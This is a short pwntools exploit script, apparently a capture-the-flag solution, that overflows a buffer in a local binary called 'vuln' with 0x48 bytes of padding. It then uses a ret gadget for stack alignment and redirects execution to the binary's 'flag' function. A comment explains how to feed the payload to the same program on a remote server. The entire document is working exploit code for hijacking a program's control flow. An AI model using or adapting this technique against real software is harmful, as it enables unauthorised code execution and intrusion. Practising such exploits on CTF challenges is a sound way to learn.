#!/bin/python3
from pwn import *


p = process('./vuln')
elf = ELF('./vuln')
rop = ROP('./vuln')



offset = 0x48


payload = b"A"*offset
payload += p64(rop.find_gadget(["ret"]).address) # optional on my local machine, but was needed to align the stack on a server
payload += p64(elf.sym['flag'])

print(payload) # if you get a permission denied on a server, just do `echo -e "paylod" | ./vuln`

p.sendline(payload)
p.interactive()
